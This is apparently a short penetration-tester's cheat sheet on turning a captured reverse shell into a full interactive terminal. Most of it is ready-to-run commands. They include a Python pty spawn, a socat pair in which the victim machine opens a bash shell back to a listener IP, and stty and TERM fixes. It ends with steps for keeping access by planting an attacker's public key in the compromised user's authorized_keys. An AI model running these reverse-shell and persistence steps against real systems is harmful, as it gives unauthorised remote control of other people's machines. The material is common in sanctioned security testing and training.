# Upgrading to Interactive Shells

## Simple upgrades  
Python  
`python -c 'import pty;pty.spawn("/bin/bash")'`  

Script  
```
exec script /dev/null      
Script started, file is /dev/null    
bash
```

Socat  
Listener:  
```socat file:`tty`,raw,echo=0 tcp-listen:<PORT>```

Victim:  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LISTENER_IP>:<PORT>`  

## Upgrading to full interactive shell  
**In existing reverse shell**  
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z   
```

Attacker  
```
stty raw -echo  
fg  
```
in zsh  
```
stty raw -echo; fg <enter><enter>
```

Victim  
```reset 
export SHELL=bash  
export TERM=xterm-256color  
stty rows <num> columns <cols>  
``` 
**SSH**  


1. Create a .ssh directory in the home directory of the compromised user.
2. Create a new keypair on the attacker machine using `ssh-keygen` 
3. Transfer the public key to the victim machine at save in the .ssh folder as `authorized_keys`
4. Apply the appropriate file permissions  
```
chmod 0700 /home/user/.ssh  
chmod 0644 /home/user/.ssh/authorized_keys
```
6. SSH into the system using the private key.
